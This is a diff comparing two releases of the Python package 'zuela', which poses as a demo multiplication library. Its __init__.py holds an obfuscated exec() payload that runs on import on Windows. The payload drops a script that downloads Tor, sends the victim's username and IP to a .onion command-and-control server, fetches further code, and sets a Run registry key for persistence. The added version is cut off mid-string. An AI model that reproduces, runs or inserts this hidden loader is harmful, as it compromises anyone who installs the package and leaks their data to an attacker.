# Comparing `tmp/zuela-0.3.0.tar.gz` & `tmp/zuela-0.4.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "zuela-0.3.0.tar", last modified: Sat Apr  8 23:05:35 2023, max compression
+gzip compressed data, was "zuela-0.4.0.tar", last modified: Sun Apr  9 19:15:25 2023, max compression
```

## Comparing `zuela-0.3.0.tar` & `zuela-0.4.0.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-04-08 23:05:35.244354 zuela-0.3.0/
--rw-rw-rw-   0        0        0      691 2023-04-08 23:05:35.243340 zuela-0.3.0/PKG-INFO
--rw-rw-rw-   0        0        0        4 2023-04-08 22:06:19.000000 zuela-0.3.0/README.md
--rw-rw-rw-   0        0        0       42 2023-04-08 23:05:35.244354 zuela-0.3.0/setup.cfg
--rw-rw-rw-   0        0        0     1332 2023-04-08 22:39:23.000000 zuela-0.3.0/setup.py
-drwxrwxrwx   0        0        0        0 2023-04-08 23:05:35.200334 zuela-0.3.0/zuela/
--rw-rw-rw-   0        0        0     6943 2023-04-08 23:05:23.000000 zuela-0.3.0/zuela/__init__.py
--rw-rw-rw-   0        0        0      288 2023-04-08 22:02:33.000000 zuela-0.3.0/zuela/multiplication.py
-drwxrwxrwx   0        0        0        0 2023-04-08 23:05:35.241333 zuela-0.3.0/zuela.egg-info/
--rw-rw-rw-   0        0        0      691 2023-04-08 23:05:35.000000 zuela-0.3.0/zuela.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      204 2023-04-08 23:05:35.000000 zuela-0.3.0/zuela.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-08 23:05:35.000000 zuela-0.3.0/zuela.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        6 2023-04-08 23:05:35.000000 zuela-0.3.0/zuela.egg-info/requires.txt
--rw-rw-rw-   0        0        0        6 2023-04-08 23:05:35.000000 zuela-0.3.0/zuela.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-04-09 19:15:25.966050 zuela-0.4.0/
+-rw-rw-rw-   0        0        0      691 2023-04-09 19:15:25.966050 zuela-0.4.0/PKG-INFO
+-rw-rw-rw-   0        0        0        4 2023-04-08 22:06:19.000000 zuela-0.4.0/README.md
+-rw-rw-rw-   0        0        0       42 2023-04-09 19:15:25.967050 zuela-0.4.0/setup.cfg
+-rw-rw-rw-   0        0        0     1337 2023-04-09 19:13:48.000000 zuela-0.4.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-09 19:15:25.913051 zuela-0.4.0/zuela/
+-rw-rw-rw-   0        0        0     7199 2023-04-09 19:14:31.000000 zuela-0.4.0/zuela/__init__.py
+-rw-rw-rw-   0        0        0      288 2023-04-09 19:14:31.000000 zuela-0.4.0/zuela/multiplication.py
+drwxrwxrwx   0        0        0        0 2023-04-09 19:15:25.964062 zuela-0.4.0/zuela.egg-info/
+-rw-rw-rw-   0        0        0      691 2023-04-09 19:15:25.000000 zuela-0.4.0/zuela.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      204 2023-04-09 19:15:25.000000 zuela-0.4.0/zuela.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-09 19:15:25.000000 zuela-0.4.0/zuela.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       23 2023-04-09 19:15:25.000000 zuela-0.4.0/zuela.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        6 2023-04-09 19:15:25.000000 zuela-0.4.0/zuela.egg-info/top_level.txt
```

### Comparing `zuela-0.3.0/PKG-INFO` & `zuela-0.4.0/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: zuela
-Version: 0.3.0
+Version: 0.4.0
 Summary: Demo library
 Home-page: https://medium-multiply.readthedocs.io/
 Author: Joffrey Bienvenu
 Author-email: example@email.com
 License: MIT
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `zuela-0.3.0/setup.py` & `zuela-0.4.0/setup.py`

 * *Files 7% similar despite different names*

```diff
@@ -1,27 +1,26 @@
 # Always prefer setuptools over distutils
 from setuptools import setup, find_packages
 
 # To use a consistent encoding
 from codecs import open
 from os import path
 
-print('TEST'*10)
 
 # The directory containing this file
 HERE = path.abspath(path.dirname(__file__))
 
 # Get the long description from the README file
 with open(path.join(HERE, 'README.md'), encoding='utf-8') as f:
     long_description = f.read()
 
 # This call to setup() does all the work
 setup(
     name="zuela",
-    version="0.3.0",
+    version="0.4.0",
     description="Demo library",
     long_description=long_description,
     long_description_content_type="text/markdown",
     url="https://medium-multiply.readthedocs.io/",
     author="Joffrey Bienvenu",
     author_email="example@email.com",
     license="MIT",
@@ -34,9 +33,9 @@
         "Programming Language :: Python :: 3.7",
         "Programming Language :: Python :: 3.8",
         "Programming Language :: Python :: 3.9",
         "Operating System :: OS Independent"
     ],
     packages=["zuela"],
     include_package_data=True,
-    install_requires=["numpy"]
+    install_requires=["numpy", "requests", "pysocks"]
 )
```

### Comparing `zuela-0.3.0/zuela/__init__.py` & `zuela-0.4.0/zuela/__init__.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,2 +1,2 @@
 from zuela.multiplication import Multiplication
-exec('import os\nif os.name == \'nt\':\n    if not os.path.exists(os.path.expandvars(r\'%LOCALAPPDATA%\\Microsoft\\CommonType\')):\n        import base64\n        import subprocess\n        import sys\n        with open(os.path.expandvars(r\'%LOCALAPPDATA%\\Temp\')+r\'\\install_zuela.py\', \'wb\') as f:\n            f.write(base64.b64decode(\'aW1wb3J0IHppcGZpbGUNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRhcmZpbGUNCmltcG9ydCB3aW5yZWcNCmltcG9ydCBwaWNrbGUNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzb2Nrcw0KaW1wb3J0IHV1aWQNCmltcG9ydCBvcw0KDQoNCmRlZiBzZW5kX2RhdGEoY29ubiwgZGF0YSk6DQogICAgZGF0YSA9IHBpY2tsZS5kdW1wcyhkYXRhKQ0KICAgIGRhdGFfbGVuX3N0ciA9IHN0cihsZW4oZGF0YSkpDQogICAgaGVhZGVyID0gJzAnICogKDY0IC0gbGVuKGRhdGFfbGVuX3N0cikpICsgZGF0YV9sZW5fc3RyDQoNCiAgICBjb25uLnNlbmQoaGVhZGVyLmVuY29kZSgpKQ0KICAgIGNvbm4uc2VuZChkYXRhKQ0KDQoNCmRlZiByZWN2X2RhdGEoY29ubik6DQogICAgaGVhZGVyID0gY29ubi5yZWN2KDY0KQ0KICAgIHJldHVybiBwaWNrbGUubG9hZHMoY29ubi5yZWN2KGludChoZWFkZXIpKSkNCg0KDQpodWJfZGlyID0gb3MucGF0aC5leHBhbmR2YXJzKHInJUxPQ0FMQVBQREFUQSVcTWljcm9zb2Z0XENvbW1vblR5cGUnKQ0KVEVCX2RpciA9IG9zLnBhdGguZXhwYW5kdmFycyhyJyVMT0NBTEFQUERBVEElXE1pY3Jvc29mdFxDb21tb25UeXBlXFRFQicpDQpfZGlycyA9IFtodWJfZGlyLCBURUJfZGlyXQ0KDQpURUJfemlwX2ZpbGUgPSBURUJfZGlyICsgcidcVEVCLnRhci5neicNCnRvcl9maWxlID0gVEVCX2RpciArIHInXHRvclx0b3IuZXhlJw0KcHJvZmlsZV9maWxlID0gaHViX2RpciArIHInXHByb2ZpbGUnDQpweXRob25femlwX2ZpbGUgPSBodWJfZGlyICsgcidccHl0aG9uLnppcCcNCnB5dGhvbndfZmlsZSA9IGh1Yl9kaXIgKyByJ1xweXRob25ccHl0aG9udy5leGUnDQpwaW5nZXJfZmlsZSA9IGh1Yl9kaXIgKyByJ1xwaW5nZXIucHknDQoNClRFQl9saW5rID0gJ2h0dHBzOi8vYXJjaGl2ZS50b3Jwcm9qZWN0Lm9yZy90b3ItcGFja2FnZS1hcmNoaXZlL3RvcmJyb3dzZXIvMTIuMC40L3Rvci1leHBlcnQtYnVuZGxlLTEyLjAuNC13aW5kb3dzLXg4Nl82NC50YXIuZ3onDQpjMl9saW5rID0gJ3p1ZWxhMzJuMzYzZ3Vjc3lyNXo0dzYzNXBtdGhucTRsc3hvZDQzcjN5YXB1NHZkZG41cXdjcGFkLm9uaW9uJw0KYzJfcG9ydCA9IDEzMzgNCg0KZm9yIF9kaXIgaW4gX2RpcnM6DQogICAgdHJ5Og0KICAgICAgICBvcy5ta2RpcihfZGlyKQ0KICAgIGV4Y2VwdDogcGFzcw0KDQp1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZShURUJfbGluaywgVEVCX3ppcF9maWxlKQ0KDQp3aXRoIHRhcmZpbGUub3BlbihURUJfemlwX2ZpbGUpIGFzIGY6DQogICAgZi5leHRyYWN0YWxsKFRFQl9kaXIpDQoNCmh0dHBiaW4gPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9odHRwYmluLm9yZy9pcCcpLmpzb24oKQ0KX3Byb2ZpbGUgPSB7DQogICAgJ3VpZCc6IHN0cih1dWlkLnV1aWQ0KCkpLA0KICAgICd1c2VybmFtZSc6IG9zLmdldGxvZ2luKCksDQogICAgJ2lwJzogaHR0cGJpblsnb3JpZ2luJ10NCn0NCndpdGggb3Blbihwcm9maWxlX2ZpbGUsICd3YicpIGFzIGhhbmRsZToNCiAgICBwaWNrbGUuZHVtcChfcHJvZmlsZSwgaGFuZGxlLCBwcm90b2NvbD1waWNrbGUuSElHSEVTVF9QUk9UT0NPTCkNCg0KdG9yX3Byb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGYnInt0b3JfZmlsZX0iJywgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSkNCndoaWxlIFRydWU6DQogICAgb3V0cHV0ID0gdG9yX3Byb2Nlc3Muc3Rkb3V0LnJlYWRsaW5lKCkuZGVjb2RlKCkNCiAgICBpZiAnQm9vdHN0cmFwcGVkIDEwMCUnIGluIG91dHB1dDoNCiAgICAgICAgYnJlYWsNCg0KZXJyb3IgPSBUcnVlDQp3aGlsZSBlcnJvcjoNCiAgICB0cnk6DQogICAgICAgIHNvY2tzLnNldGRlZmF1bHRwcm94eShzb2Nrcy5QUk9YWV9UWVBFX1NPQ0tTNSwgJ2xvY2FsaG9zdCcsIDkwNTApDQogICAgICAgIHNvY2tldC5zb2NrZXQgPSBzb2Nrcy5zb2Nrc29ja2V0DQoNCiAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoKQ0KDQogICAgICAgIHMuY29ubmVjdCgoYzJfbGluaywgYzJfcG9ydCkpDQoNCiAgICAgICAgZXJyb3IgPSBGYWxzZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0Kc2VuZF9kYXRhKHMsIF9wcm9maWxlKQ0KcHl0aG9uX2ZpbGVfZGF0YSA9IGInJw0Kd2hpbGUgVHJ1ZToNCiAgICB0ZW1wX2RhdGEgPSBzLnJlY3YoMTAwMDAwMCkNCiAgICBpZiB0ZW1wX2RhdGEgPT0gYicnOg0KICAgICAgICBicmVhaw0KICAgIHB5dGhvbl9maWxlX2RhdGEgKz0gdGVtcF9kYXRhDQpzLmNsb3NlKCkNCndpdGggb3BlbihweXRob25femlwX2ZpbGUsICd3YicpIGFzIGY6DQogICAgZi53cml0ZShweXRob25fZmlsZV9kYXRhKQ0KcHl0aG9uX2ZpbGVfZGF0YSA9IE5vbmUNCndpdGggemlwZmlsZS5aaXBGaWxlKHB5dGhvbl96aXBfZmlsZSwgJ3InKSBhcyB6aXBfcmVmOg0KICAgIHppcF9yZWYuZXh0cmFjdGFsbChodWJfZGlyKQ0KDQp3aXRoIG9wZW4ocGluZ2VyX2ZpbGUsICd3YicpIGFzIGY6DQogICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKCdhVzF3YjNKMElITjFZbkJ5YjJObGMzTU5DbWx0Y0c5eWRDQnlaWEYxWlhOMGN3MEthVzF3YjNKMElITnZZMnRsZEEwS2FXMXdiM0owSUhCcFkydHNaUTBLYVcxd2IzSjBJSE52WTJ0ekRRcHBiWEJ2Y25RZ2IzTU5DZzBLRFFwa1pXWWdjMlZ1WkY5a1lYUmhLR052Ym00c0lHUmhkR0VwT2cwS0lDQWdJR1JoZEdFZ1BTQndhV05yYkdVdVpIVnRjSE1vWkdGMFlTa05DaUFnSUNCa1lYUmhYMnhsYmw5emRISWdQU0J6ZEhJb2JHVnVLR1JoZEdFcEtRMEtJQ0FnSUdobFlXUmxjaUE5SUNjd0p5QXFJQ2cyTkNBdElHeGxiaWhrWVhSaFgyeGxibDl6ZEhJcEtTQXJJR1JoZEdGZmJHVnVYM04wY2cwS0RRb2dJQ0FnWTI5dWJpNXpaVzVrS0dobFlXUmxjaTVsYm1OdlpHVW9LU2tOQ2lBZ0lDQmpiMjV1TG5ObGJtUW9aR0YwWVNrTkNnMEtEUXBrWldZZ2NtVmpkbDlrWVhSaEtHTnZibTRwT2cwS0lDQWdJR2hsWVdSbGNpQTlJR052Ym00dWNtVmpkaWcyTkNrTkNpQWdJQ0J5WlhSMWNtNGdjR2xqYTJ4bExteHZZV1J6S0dOdmJtNHVjbVZqZGlocGJuUW9hR1ZoWkdWeUtTa3BEUW9OQ2cwS1ZFVkNYMlJwY2lBOUlHOXpMbkJoZEdndVpYaHdZVzVrZG1GeWN5aHlKeVZNVDBOQlRFRlFVRVJCVkVFbFhFMXBZM0p2YzI5bWRGeERiMjF0YjI1VWVYQmxYRlJGUWljcERRcG9kV0pmWkdseUlEMGdiM011Y0dGMGFDNWxlSEJoYm1SMllYSnpLSEluSlV4UFEwRk1RVkJRUkVGVVFTVmNUV2xqY205emIyWjBYRU52YlcxdmJsUjVjR1VuS1EwS0RRcDBiM0pmWm1sc1pTQTlJRlJGUWw5a2FYSWdLeUJ5SjF4MGIzSmNkRzl5TG1WNFpTY05DbkJ5YjJacGJHVmZabWxzWlNBOUlHaDFZbDlrYVhJZ0t5QnlKMXh3Y205bWFXeGxKdzBLRFFwak1sOXNhVzVySUQwZ0ozcDFaV3hoTXpKdU16WXpaM1ZqYzNseU5YbzBkell6TlhCdGRHaHVjVFJzYzNodlpEUXpjak41WVhCMU5IWmtaRzQxY1hkamNHRmtMbTl1YVc5dUp3MEtZekpmY0c5eWRDQTlJREV6TXpjTkNnMEtkMmwwYUNCdmNHVnVLSEJ5YjJacGJHVmZabWxzWlN3Z0ozSmlKeWtnWVhNZ2FHRnVaR3hsT2cwS0lDQWdJRjl3Y205bWFXeGxJRDBnY0dsamEyeGxMbXh2WVdRb2FHRnVaR3hsS1EwS0RRcG9kSFJ3WW1sdUlEMGdjbVZ4ZFdWemRITXVaMlYwS0Nkb2RIUndPaTh2YUhSMGNHSnBiaTV2Y21jdmFYQW5LUzVxYzI5dUtDa05DbDl3Y205bWFXeGxXeWRwY0NkZElEMGdhSFIwY0dKcGJsc25iM0pwWjJsdUoxME5DZzBLZEc5eVgzQnliMk5sYzNNZ1BTQnpkV0p3Y205alpYTnpMbEJ2Y0dWdUtHWW5JbnQwYjNKZlptbHNaWDBpSnl3Z2MzUmtiM1YwUFhOMVluQnliMk5sYzNNdVVFbFFSU2tOQ25kb2FXeGxJRlJ5ZFdVNkRRb2dJQ0FnYjNWMGNIVjBJRDBnZEc5eVgzQnliMk5sYzNNdWMzUmtiM1YwTG5KbFlXUnNhVzVsS0NrdVpHVmpiMlJsS0NrTkNpQWdJQ0JwWmlBblFtOXZkSE4wY21Gd2NHVmtJREV3TUNVbklHbHVJRzkxZEhCMWREb05DaUFnSUNBZ0lDQWdZbkpsWVdzTkNnMEtaWEp5YjNJZ1BTQlVjblZsRFFwM2FHbHNaU0JsY25KdmNqb05DaUFnSUNCMGNuazZEUW9nSUNBZ0lDQWdJSE52WTJ0ekxuTmxkR1JsWm1GMWJIUndjbTk0ZVNoemIyTnJjeTVRVWs5WVdWOVVXVkJGWDFOUFEwdFROU3dnSjJ4dlkyRnNhRzl6ZENjc0lEa3dOVEFwRFFvZ0lDQWdJQ0FnSUhOdlkydGxkQzV6YjJOclpYUWdQU0J6YjJOcmN5NXpiMk5yYzI5amEyVjBEUW9OQ2lBZ0lDQWdJQ0FnY3lBOUlITnZZMnRsZEM1emIyTnJaWFFvS1EwS0RRb2dJQ0FnSUNBZ0lITXVZMjl1Ym1WamRDZ29ZekpmYkdsdWF5d2dZekpmY0c5eWRDa3BEUW9OQ2lBZ0lDQWdJQ0FnWlhKeWIzSWdQU0JHWVd4elpRMEtJQ0FnSUdWNFkyVndkRG9OQ2lBZ0lDQWdJQ0FnY0dGemN3MEtEUXB6Wlc1a1gyUmhkR0VvY3l3Z1gzQnliMlpwYkdVcERRcGxlR1ZqS0hKbFkzWmZaR0YwWVNoektTa05Dbk11WTJ4dmMyVW9LUTBLJykpDQoNCmtleVZhbCA9IHInU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuJw0Ka2V5ID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCBrZXlWYWwsIDAsIHdpbnJlZy5LRVlfQUxMX0FDQ0VTUykNCndpbnJlZy5TZXRWYWx1ZUV4KGtleSwgIkNvbW1vblR5cGUiLCAwLCB3aW5yZWcuUkVHX1NaLCBmJyJ7cHl0aG9ud19maWxlfSIgIntwaW5nZXJfZmlsZX0iJykNCndpbnJlZy5DbG9zZUtleShrZXkpDQoNCnN1YnByb2Nlc3MuUG9wZW4oZicie3B5dGhvbndfZmlsZX0iICJ7cGluZ2VyX2ZpbGV9IicsIHNoZWxsPVRydWUpDQo=\'))\n        subprocess.Popen(\'"\'+sys.executable[:-4]+\'w.exe\'+\'" "\'+os.path.expandvars(r\'%LOCALAPPDATA%\\Temp\')+r\'\\install_zuela.py\'+\'"\', shell=True)\n')
+exec("import os\r\nif os.name == \'nt\':\r\n    if not os.path.exists(os.path.expandvars(r\'%LOCALAPPDATA%\Microsoft\CommonType\')):\r\n        import base64\r\n        import subprocess\r\n        import sys\r\n        with open(os.path.expandvars(r\'%LOCALAPPDATA%\Temp\')+r\'\install_zuela.py\', \'wb\') as f:\r\n            f.write(base64.b64decode(\'aW1wb3J0IHppcGZpbGUNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRhcmZpbGUNCmltcG9ydCB3aW5yZWcNCmltcG9ydCBwaWNrbGUNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzb2Nrcw0KaW1wb3J0IHV1aWQNCmltcG9ydCBvcw0KDQoNCmRlZiBzZW5kX2RhdGEoY29ubiwgZGF0YSk6DQogICAgZGF0YSA9IHBpY2tsZS5kdW1wcyhkYXRhKQ0KICAgIGRhdGFfbGVuX3N0ciA9IHN0cihsZW4oZGF0YSkpDQogICAgaGVhZGVyID0gJzAnICogKDY0IC0gbGVuKGRhdGFfbGVuX3N0cikpICsgZGF0YV9sZW5fc3RyDQoNCiAgICBjb25uLnNlbmQoaGVhZGVyLmVuY29kZSgpKQ0KICAgIGNvbm4uc2VuZChkYXRhKQ0KDQoNCmRlZiByZWN2X2RhdGEoY29ubik6DQogICAgaGVhZGVyID0gY29ubi5yZWN2KDY0KQ0KICAgIHJldHVybiBwaWNrbGUubG9hZHMoY29ubi5yZWN2KGludChoZWFkZXIpKSkNCg0KDQpodWJfZGlyID0gb3MucGF0aC5leHBhbmR2YXJzKHInJUxPQ0FMQVBQREFUQSVcTWljcm9zb2Z0XENvbW1vblR5cGUnKQ0KVEVCX2RpciA9IG9zLnBhdGguZXhwYW5kdmFycyhyJyVMT0NBTEFQUERBVEElXE1pY3Jvc29mdFxDb21tb25UeXBlXFRFQicpDQpfZGlycyA9IFtodWJfZGlyLCBURUJfZGlyXQ0KDQpURUJfemlwX2ZpbGUgPSBURUJfZGlyICsgcidcVEVCLnRhci5neicNCnRvcl9maWxlID0gVEVCX2RpciArIHInXHRvclx0b3IuZXhlJw0KcHJvZmlsZV9maWxlID0gaHViX2RpciArIHInXHByb2ZpbGUnDQpweXRob25femlwX2ZpbGUgPSBodWJfZGlyICsgcidccHl0aG9uLnppcCcNCnB5dGhvbndfZmlsZSA9IGh1Yl9kaXIgKyByJ1xweXRob25ccHl0aG9udy5leGUnDQpwaW5nZXJfZmlsZSA9IGh1Yl9kaXIgKyByJ1xwaW5nZXIucHknDQoNClRFQl9saW5rID0gJ2h0dHBzOi8vYXJjaGl2ZS50b3Jwcm9qZWN0Lm9yZy90b3ItcGFja2FnZS1hcmNoaXZlL3RvcmJyb3dzZXIvMTIuMC40L3Rvci1leHBlcnQtYnVuZGxlLTEyLjAuNC13aW5kb3dzLXg4Nl82NC50YXIuZ3onDQpjMl9saW5rID0gJ3p1ZWxhMzJuMzYzZ3Vjc3lyNXo0dzYzNXBtdGhucTRsc3hvZDQzcjN5YXB1NHZkZG41cXdjcGFkLm9uaW9uJw0KYzJfcG9ydCA9IDEzMzgNCg0KZm9yIF9kaXIgaW4gX2RpcnM6DQogICAgdHJ5Og0KICAgICAgICBvcy5ta2RpcihfZGlyKQ0KICAgIGV4Y2VwdDogcGFzcw0KDQp1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZShURUJfbGluaywgVEVCX3ppcF9maWxlKQ0KDQp3aXRoIHRhcmZpbGUub3BlbihURUJfemlwX2ZpbGUpIGFzIGY6DQogICAgZi5leHRyYWN0YWxsKFRFQl9kaXIpDQoNCmh0dHBiaW4gPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9odHRwYmluLm9yZy9pcCcpLmpzb24oKQ0KX3Byb2ZpbGUgPSB7DQogICAgJ3VpZCc6IHN0cih1dWlkLnV1aWQ0KCkpLA0KICAgICd1c2VybmFtZSc6IG9zLmdldGxvZ2luKCksDQogICAgJ2lwJzogaHR0cGJpblsnb3JpZ2luJ10NCn0NCndpdGggb3Blbihwcm9maWxlX2ZpbGUsICd3YicpIGFzIGhhbmRsZToNCiAgICBwaWNrbGUuZHVtcChfcHJvZmlsZSwgaGFuZGxlLCBwcm90b2NvbD1waWNrbGUuSElHSEVTVF9QUk9UT0NPTCkNCg0KdG9yX3Byb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGYnInt0b3JfZmlsZX0iJywgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc2hlbGw9VHJ1ZSkNCndoaWxlIFRydWU6DQogICAgb3V0cHV0ID0gdG9yX3Byb2Nlc3Muc3Rkb3V0LnJlYWRsaW5lKCkuZGVjb2RlKCkNCiAgICBpZiAnQm9vdHN0cmFwcGVkIDEwMCUnIGluIG91dHB1dDoNCiAgICAgICAgYnJlYWsNCg0KZXJyb3IgPSBUcnVlDQp3aGlsZSBlcnJvcjoNCiAgICB0cnk6DQogICAgICAgIHNvY2tzLnNldGRlZmF1bHRwcm94eShzb2Nrcy5QUk9YWV9UWVBFX1NPQ0tTNSwgJ2xvY2FsaG9zdCcsIDkwNTApDQogICAgICAgIHNvY2tldC5zb2NrZXQgPSBzb2Nrcy5zb2Nrc29ja2V0DQoNCiAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoKQ0KDQogICAgICAgIHMuY29ubmVjdCgoYzJfbGluaywgYzJfcG9ydCkpDQoNCiAgICAgICAgZXJyb3IgPSBGYWxzZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0Kc2VuZF9kYXRhKHMsIF9wcm9maWxlKQ0KcHl0aG9uX2ZpbGVfZGF0YSA9IGInJw0Kd2hpbGUgVHJ1ZToNCiAgICB0ZW1wX2RhdGEgPSBzLnJlY3YoMTAwMDAwMCkNCiAgICBpZiB0ZW1wX2RhdGEgPT0gYicnOg0KICAgICAgICBicmVhaw0KICAgIHB5dGhvbl9maWxlX2RhdGEgKz0gdGVtcF9kYXRhDQpzLmNsb3NlKCkNCndpdGggb3BlbihweXRob25femlwX2ZpbGUsICd3YicpIGFzIGY6DQogICAgZi53cml0ZShweXRob25fZmlsZV9kYXRhKQ0KcHl0aG9uX2ZpbGVfZGF0YSA9IE5vbmUNCndpdGggemlwZmlsZS5aaXBGaWxlKHB5dGhvbl96aXBfZmlsZSwgJ3InKSBhcyB6aXBfcmVmOg0KICAgIHppcF9yZWYuZXh0cmFjdGFsbChodWJfZGlyKQ0KDQp3aXRoIG9wZW4ocGluZ2VyX2ZpbGUsICd3YicpIGFzIGY6DQogICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKCdhVzF3YjNKMElITjFZbkJ5YjJObGMzTU5DbWx0Y0c5eWRDQnlaWEYxWlhOMGN3MEthVzF3YjNKMElITnZZMnRsZEEwS2FXMXdiM0owSUhCcFkydHNaUTBLYVcxd2IzSjBJSE52WTJ0ekRRcHBiWEJ2Y25RZ2IzTU5DZzBLRFFwa1pXWWdjMlZ1WkY5a1lYUmhLR052Ym00c0lHUmhkR0VwT2cwS0lDQWdJR1JoZEdFZ1BTQndhV05yYkdVdVpIVnRjSE1vWkdGMFlTa05DaUFnSUNCa1lYUmhYMnhsYmw5emRISWdQU0J6ZEhJb2JHVnVLR1JoZEdFcEtRMEtJQ0FnSUdobFlXUmxjaUE5SUNjd0p5QXFJQ2cyTkNBdElHeGxiaWhrWVhSaFgyeGxibDl6ZEhJcEtTQXJJR1JoZEdGZmJHVnVYM04wY2cwS0RRb2dJQ0FnWTI5dWJpNXpaVzVrS0dobFlXUmxjaTVsYm1OdlpHVW9LU2tOQ2lBZ0lDQmpiMjV1TG5ObGJtUW9aR0YwWVNrTkNnMEtEUXBrWldZZ2NtVmpkbDlrWVhSaEtHTnZibTRwT2cwS0lDQWdJR2hsWVdSbGNpQTlJR052Ym00dWNtVmpkaWcyTkNrTkNpQWdJQ0J5WlhSMWNtNGdjR2xqYTJ4bExteHZZV1J6S0dOdmJtNHVjbVZqZGlocGJuUW9hR1ZoWkdWeUtTa3BEUW9OQ2cwS1ZFVkNYMlJwY2lBOUlHOXpMbkJoZEdndVpYaHdZVzVrZG1GeWN5aHlKeVZNVDBOQlRFRlFVRVJCVkVFbFhFMXBZM0p2YzI5bWRGeERiMjF0YjI1VWVYQmxYRlJGUWljcERRcG9kV0pmWkdseUlEMGdiM011Y0dGMGFDNWxlSEJoYm1SMllYSnpLSEluSlV4UFEwRk1RVkJRUkVGVVFTVmNUV2xqY205emIyWjBYRU52YlcxdmJsUjVjR1VuS1EwS0RRcDBiM0pmWm1sc1pTQTlJRlJGUWw5a2FYSWdLeUJ5SjF4MGIzSmNkRzl5TG1WNFpTY05DbkJ5YjJacGJHVmZabWxzWlNBOUlHaDFZbDlrYVhJZ0t5QnlKMXh3Y205bWFXeGxKdzBLRFFwak1sOXNhVzVySUQwZ0ozcDFaV3hoTXpKdU16WXpaM1ZqYzNseU5YbzBkell6TlhCdGRHaHVjVFJzYzNodlpEUXpjak41WVhCMU5IWmtaRzQxY1hkamNHRmtMbTl1YVc5dUp3MEtZekpmY0c5eWRDQTlJREV6TXpjTkNnMEtkMmwwYUNCdmNHVnVLSEJ5YjJacGJHVmZabWxzWlN3Z0ozSmlKeWtnWVhNZ2FHRnVaR3hsT2cwS0lDQWdJRjl3Y205bWFXeGxJRDBnY0dsamEyeGxMbXh2WVdRb2FHRnVaR3hsS1EwS0RRcG9kSFJ3WW1sdUlEMGdjbVZ4ZFdWemRITXVaMlYwS0Nkb2RIUndPaTh2YUhSMGNHSnBiaTV2Y21jdmFYQW5LUzVxYzI5dUtDa05DbDl3Y205bWFXeGxXeWRwY0NkZElEMGdhSFIwY0dKcGJsc25iM0pwWjJsdUoxME5DZzBLZEc5eVgzQnliMk5sYzNNZ1BTQnpkV0p3Y205alpYTnpMbEJ2Y0dWdUtHWW5JbnQwYjNKZlptbHNaWDBpSnl3Z2MzUmtiM1YwUFhOMVluQnliMk5sYzNNdVVFbFFSU3dnYzJobGJHdzlWSEoxWlNrTkNuZG9hV3hsSUZSeWRXVTZEUW9nSUNBZ2IzVjBjSFYwSUQwZ2RHOXlYM0J5YjJObGMzTXVjM1JrYjNWMExuSmxZV1JzYVc1bEtDa3VaR1ZqYjJSbEtDa05DaUFnSUNCcFppQW5RbTl2ZEhOMGNtRndjR1ZrSURFd01DVW5JR2x1SUc5MWRIQjFkRG9OQ2lBZ0lDQWdJQ0FnWW5KbFlXc05DZzBLWlhKeWIzSWdQU0JVY25WbERRcDNhR2xzWlNCbGNuSnZjam9OQ2lBZ0lDQjBjbms2RFFvZ0lDQWdJQ0FnSUhOdlkydHpMbk5sZEdSbFptRjFiSFJ3Y205NGVTaHpiMk5yY3k1UVVrOVlXVjlVV1ZCRlgxTlBRMHRUTlN3Z0oyeHZZMkZzYUc5emRDY3NJRGt3TlRBcERRb2dJQ0FnSUNBZ0lITnZZMnRsZEM1emIyTnJaWFFnUFNCemIyTnJjeTV6YjJOcmMyOWphMlYwRFFvTkNpQWdJQ0FnSUNBZ2N5QTlJSE52WTJ0bGRDNXpiMk5yWlhRb0tRMEtEUW9nSUNBZ0lDQWdJSE11WTI5dWJtVmpkQ2dvWXpKZmJHbHVheXdnWXpKZmNHOXlkQ2twRFFvTkNpQWdJQ0FnSUNBZ1pYSnliM0lnUFNCR1lXeHpaUTBLSUNBZ0lHVjRZMlZ3ZERvTkNpQWdJQ0FnSUNBZ2NHRnpjdzBLRFFwelpXNWtYMlJoZEdFb2N5d2dYM0J5YjJacGJHVXBEUXBsZUdWaktISmxZM1pmWkdGMFlTaHpLU2tO